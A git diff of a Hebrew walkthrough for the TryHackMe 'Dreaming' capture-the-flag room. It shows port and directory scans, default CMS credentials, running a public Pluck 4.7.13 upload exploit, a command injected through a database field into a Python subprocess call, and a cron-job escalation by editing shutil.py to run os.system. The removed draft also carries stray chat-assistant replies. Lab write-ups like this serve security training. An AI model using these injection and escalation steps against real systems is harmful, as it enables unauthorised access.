@@ -1,155 +1,76 @@
-# THM---Challenges---Dreaming
+💤 מדריך פתרון למכונת Dreaming
+שלב 1: איסוף מידע (Footprinting)
+בשלב הראשון נרצה להבין אילו שירותים רצים על המכונה.
 
+הפקודה שביצעתי:
 
-:
-
----
-
-# תיעוד פריצה (Writeup) - חדר Dreaming ב-TryHackMe
-
-**כתובת ה-IP של המטרה:** `10.112.185.22`  
-**תאריך:** 26 במרץ, 2026
-
----
-
-## שלב 1: איסוף מידע (Footprinting & Reconnaissance)
-
-הצעד הראשון שביצעתי הוא סריקת הפורטים הפתוחים במכונה כדי להבין את "שטח הפנים" של התקיפה. השתמשתי בכלי **Nmap** עם דגלי `sS-` (סריקת SYN מהירה) ו-`v-` (פלט מפורט).
-
-### סריקת Nmap
-```bash
-root@ip-10-112-110-19:~# nmap -sS -v 10.112.185.22
-
-
-```
-<img width="1705" height="831" alt="image" src="https://github.com/user-attachments/assets/ce6cb0b5-020c-4a3f-81c2-d2a8d503cf2d" />
-<img width="1705" height="831" alt="image" src="https://github.com/user-attachments/assets/ce6cb0b5-020c-4a3f-81c2-d2a8d503cf2d" />
-
-
-**תוצאות הסריקה:**
-
-| פורט | מצב | שירות | הערות |
-| :--- | :--- | :--- | :--- |
-| **22/tcp** | פתוח | SSH | גישה מרחוק. עשוי לשמש בהמשך לאחר השגת אישורים (Credentials). |
-| **80/tcp** | פתוח | HTTP | שרת אינטרנט. כנראה נקודת הכניסה הראשונית למערכת. |
-
-**סיכום ביניים:**
-הסריקה מראה שני פורטים סטנדרטיים. מכיוון שפורט 80 פתוח, סביר להניח שהשלב הבא יהיה חקירה של אפליקציית האינטרנט כדי למצוא פגיעויות או קבצים חשופים.
-
----
-הבנתי, אתה רוצה שנמשיך לתעד כל שלב בצורה מסודרת כחלק מהדו"ח (Writeup) המקצועי שלך. בוא נעדכן את הדו"ח עם הממצאים החדשים מ-Gobuster ונכין את התשתית לשלב הבא.
-
----
-
-## שלב 2: סריקת ספריות (Directory Enumeration)
-
-לאחר שווידאתי שהשרת פעיל (דף ברירת המחדל של Apache), הרצתי סריקת ספריות באמצעות הכלי **Gobuster** כדי למצוא נתיבים חבויים שעשויים להכיל את האפליקציה או נקודות תורפה.
-
-### פקודת הסריקה:
-`gobuster dir -u http://10.114.130.181 -w /usr/share/wordlists/dirb/big.txt`
-
-### תוצאות הסריקה:
-| נתיב (Path) | סטטוס (Status) | הערות |
-| :--- | :--- | :--- |
-| **`/app`** | **301 (Redirect)** | **היעד המרכזי.** מצביע על קיום ספריית אפליקציה. |
-| `/.htaccess` | 403 (Forbidden) | קובץ הגדרות שרת - הגישה חסומה. |
-| `/.htpasswd` | 403 (Forbidden) | קובץ סיסמאות מוגן - הגישה חסומה. |
-| `/server-status` | 403 (Forbidden) | דף סטטיסטיקה של Apache - הגישה חסומה. |
-
-**סיכום ביניים:** הסריקה הניבה תוצאה קריטית: הספרייה `/app`. סטטוס 301 מאשר שהספרייה קיימת ומפנה אותנו לתוכן הפנימי שלה.
-
----
-
-## שלב 3: חקירת אפליקציית האינטרנט (Web Application Analysis)
-
-כעת, המטרה היא להבין מה רץ בתוך נתיב ה-`/app`.
-
-### פעולות לביצוע (To-Do):
-1.  **בדיקה ויזואלית:** כניסה בדפדפן לכתובת `http://10.114.130.181/app/`.
-2.  **ניתוח קוד מקור (Page Source):** חיפוש הערות (Comments), שמות משתמש פוטנציאליים או גרסאות של ספריות צד-שלישי.
-3.  **Fuzzing ממוקד:** הרצת סריקה נוספת בתוך `/app/` כדי למצוא קבצים ספציפיים (כמו `login.php`, `config.php`, `index.html`).
-
-### פקודה מומלצת להמשך הסריקה:
-```bash
-gobuster dir -u http://10.114.130.181/app/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js
-```
-<img width="992" height="860" alt="image" src="https://github.com/user-attachments/assets/4f8b255c-c441-4a88-9dbf-4c968e049b88" />
-
----
-
-**איך להתקדם?**
-ברגע שתיכנס ל-`/app/` בדפדפן, תגיד לי מה אתה רואה (למשל: דף התחברות, הודעת שגיאה, או אתר פעיל). אם תצרף צילום מסך של ה-`/app/` או של ה-**Source Code** שלו, נוכל לזהות את וקטור התקיפה הבא (כמו SQL Injection, Command Injection או גילוי מידע).
-
-**
-<img width="1001" height="821" alt="image" src="https://github.com/user-attachments/assets/85e61d0c-6de1-4dbf-aa53-c558148de93f" />
-
-
-
-
-<img width="992" height="701" alt="image" src="https://github.com/user-attachments/assets/32bb4164-4e06-4dd4-ba74-2e2c20a4e82a" />
-
-שלב 3: זיהוי המטרה (Target Identification)
-לאחר ביצוע סריקת ספריות בנתיב /app, התגלה כי השרת חשוף לפגיעות Directory Listing (חשיפת תוכן ספריות).
-
-ממצאים:
-נתיב מזוהה: http://10.114.130.181/app/pluck-4.7.13/
-
-טכנולוגיה: Pluck CMS
-
-גרסה: 4.7.13
-
-תאריך שינוי אחרון (בשרת): 2020-01-29
-
-סיכון: חשיפת גרסה מדויקת של מערכת ניהול תוכן (CMS) מאפשרת לתוקף לחפש פרצות אבטחה ידועות (Public Exploits) התואמות לגרסה זו באופן ספציפי
-
-
-
-שלב 5: השגת גישה למערכת הניהול (Initial Access - CMS Admin)
-לאחר זיהוי המערכת כ-Pluck CMS, השלב הבא היה איתור נקודת הכניסה וניסיון השגת הרשאות ניהול.
-
-ממצאים:
-דף לוגין: אותר בנתיב http://10.114.130.181/app/pluck-4.7.13/login.php.
-
-ניתוח אישורים (Credentials): מתוך מחקר מקוון על הגדרות ברירת המחדל של Pluck, נמצא כי שם המשתמש והסיסמה הדיפולטיביים הם:
-<img width="1006" height="810" alt="image" src="https://github.com/user-attachments/assets/37b567b0-aeff-4824-ba52-b300b1a3cffe" />
-
-Username: admin
-
-Password: password
-
-פעולה שבוצעה:
-הזנת האישורים בדף הלוגין אפשרה כניסה מוצלחת ללוח הבקרה (Admin Panel). כעת יש לנו שליטה מלאה על תכני האתר.
-
-<img width="989" height="715" alt="image" src="https://github.com/user-attachments/assets/ab776bff-34cb-46bc-ab88-e40cb4db8c4b" />
-
-
-
-שלב 6 - שלב הפריצה (Exploitation). אחרי שמצאנו את דף הניהול וגילינו שהסיסמה היא password, אנחנו משתמשים ב-Exploit מוכן שכתוב בפייתון כדי להשיג גישה למערכת (Webshell).
-
-להלן הסבר על הפקודות ומה הן עושות:
-
-1. הורדת הקוד הזדוני (Exploit)
 Bash
-wget https://www.exploit-db.com/download/49909 -O exploit.py
-wget: פקודה להורדת קבצים מהאינטרנט.
+nmap -sS -v <MACHINE_IP>
+מה אמורים לגלות: פורטים פתוחים ושירותים זמינים.
 
-הקישור: מפנה למאגר Exploit-DB, שם נמצא קוד שמנצל פגיעות ספציפית בגרסה 4.7.13 של Pluck.
+מה גיליתי: רק פורטים 22 (SSH) ו-80 (HTTP) פתוחים. בביקור בדפדפן מופיע דף ברירת המחדל של Apache.
 
-exploit.py -O: דגל שאומר למחשב לשמור את הקובץ שהורד בשם exploit.py.
+שלב 2: סריקת ספריות (Directory Enumeration)
+מכיוון שהדף הראשי ריק, נחפש ספריות חבויות בשרת הווב.
 
-2. הרצת ה-Exploit
+הפקודה שביצעתי:
+
 Bash
-python3 ./exploit.py 10.114.130.181 80 password /app/pluck-4.7.13
-כאן אתה מריץ את התוכנית ומזין לה "ארגומנטים" (נתונים) כדי שהיא תדע איפה לתקוף:
+gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/big.txt
+מה אמורים לגלות: נתיבים או קבצים שלא מופיעים בקישורים רגילים.
 
-python3: שימוש בשפת פייתון להרצת הקובץ.
+מה גיליתי: נמצאה ספרייה בשם /app. בתוכה מצאתי התקנה של מערכת ניהול תוכן (CMS) בשם Pluck בגרסה 4.7.13.
 
-10.114.130.181: כתובת ה-IP של המטרה (Target).
+שלב 3: פריצה ראשונית (Initial Access) ודגל Lucien
+ננסה להיכנס לממשק הניהול של Pluck ולנצל פגיעות ידועה.
 
-80: הפורט שבו רץ אתר האינטרנט.
+הפקודה שביצעתי:
 
-password: הסיסמה שמצאנו קודם ללוח הניהול (הסקריפט צריך להתחבר כדי להעלות קובץ).
+ניסיון התחברות ב-http://<MACHINE_IP>/app/pluck-4.7.13/login.php עם סיסמת ברירת המחדל password.
 
-/app/pluck-4.7.13: הנתיב המדויק שבו מותקנת המערכת בשרת.
+הרצת אקספלויט (CVE-2020-29607) להעלאת קובץ זדוני:
 
-<img width="984" height="805" alt="image" src="https://github.com/user-attachments/assets/1229dd4c-e0e0-4c43-8abc-efbe7a8a6364" />
+Bash
+python3 exploit.py <MACHINE_IP> 80 password /app/pluck-4.7.13
+מה אמורים לגלות: גישה למערכת הקבצים (Webshell).
+
+מה גיליתי: בתוך /opt מצאתי קובץ בשם test.py המכיל את הסיסמה של המשתמש Lucien בטקסט גלוי. השתמשתי בה להתחברות ב-SSH וקראתי את הדגל הראשון.
+
+שלב 4: העלאת הרשאות למשתמש Death
+נבדוק מה Lucien יכול להריץ בהרשאות גבוהות.
+
+הפקודה שביצעתי:
+
+Bash
+sudo -l
+cat ~/.bash_history
+מה אמורים לגלות: פקודות sudo מותרות או סיסמאות בהיסטוריה.
+
+מה גיליתי: Lucien יכול להריץ סקריפט בשם getDreams.py כמשתמש death. בנוסף, מצאתי סיסמת MySQL בהיסטוריית הפקודות.
+
+הזרקת פקודה (Command Injection):
+הסקריפט getDreams.py משתמש ב-subprocess בצורה לא מאובטחת. נכנסתי ל-MySQL והזרקתי פקודה לטבלה:
+
+SQL
+use library;
+insert into dreams (dreamer, dream) VALUES ("'flag'", "'; cat /home/death/death_flag.txt; # ");
+לאחר מכן הרצתי את הסקריפט: sudo -u death /opt/scripts/getDreams.py וקיבלתי את דגל ה-Death.
+
+שלב 5: העלאת הרשאות למשתמש Morpheus (Root/Final Flag)
+כעת כשיש לנו את הסיסמה של Death (מהסקריפט), נעבור אליו ונחפש דרך להפוך ל-Morpheus.
+
+הפקודה שביצעתי:
+
+Bash
+find / -type f -group morpheus 2> /dev/null
+ls -al /usr/lib/python3.8/shutil.py
+מה אמורים לגלות: קבצים ששייכים לקבוצת morpheus או הרשאות כתיבה בספריות מערכת.
+
+מה גיליתי: ישנו סקריפט גיבוי בשם restore.py שרץ כנראה כ-Cron Job על ידי Morpheus. גיליתי שלמשתמש death יש הרשאת כתיבה לספריית הפייתון shutil.py.
+
+הביצוע:
+ערכתי את הקובץ /usr/lib/python3.8/shutil.py והוספתי לפונקציה copy2 את השורה הבאה:
+
+Python
+os.system("chmod 777 /home/morpheus/morpheus_flag.txt")
+התוצאה: כשהסקריפט restore.py רץ אוטומטית, הוא קרא לספריית shutil, והפקודה שלי שינתה את ההרשאות של הדגל. כעת יכולתי לקרוא את הדגל האחרון של Morpheus.
